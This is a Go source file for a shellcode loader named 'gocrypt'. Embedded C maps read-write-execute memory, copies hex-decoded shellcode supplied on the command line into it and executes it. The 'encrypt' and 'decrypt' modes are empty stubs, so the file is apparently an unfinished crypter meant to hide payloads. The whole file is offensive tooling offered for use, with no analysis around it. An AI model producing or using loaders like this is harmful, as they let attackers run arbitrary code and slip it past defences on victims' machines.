package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
void execute(char *shellcode, size_t length) {
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"unsafe"
)

func main() {
	shellcode, password, action, err := getInput()
	if err != nil {
		os.Exit(1)
	}
	action(&shellcode, *password)
}

func getInput() ([]byte, *string, func(*[]byte, string) error, error) {
	if len(os.Args) != 4 {
		fmt.Printf("Usage: gocrypt {mode} {shellcode} {password}\n")
		return nil, nil, nil, errors.New("Wring number of arguments")
	}

	option := os.Args[1]
	var action func(*[]byte, string) error
	switch option {
	case "encrypt":
		action = encrypt
		break
	case "decrypt":
		action = decrypt
		break
	case "run":
		action = decryptAndRun
		break
	}
	if action == nil {
		return nil, nil, nil, errors.New("Not a valid mode")
	}

	shellcode, err := hex.DecodeString(os.Args[2])
	if err != nil {
		fmt.Printf("Error decoding shellcode: %s\n", err)
		return nil, nil, nil, errors.New("Wring number of arguments")
	}

	password := os.Args[3]

	return shellcode, &password, action, nil
}

func encrypt(shellcode *[]byte, password string) error {
	return nil
}

func decrypt(encryptedShellcode *[]byte, password string) error {
	return nil
}

func decryptAndRun(encryptedShellcode *[]byte, password string) error {
	decrypt(encryptedShellcode, password)
	shellcode := *encryptedShellcode
	run(shellcode)
	return nil
}

func run(shellcode []byte) {
	ptr := &shellcode[0]
	size := len(shellcode)
	C.execute((*C.char)(unsafe.Pointer(ptr)), (C.size_t)(size))
}
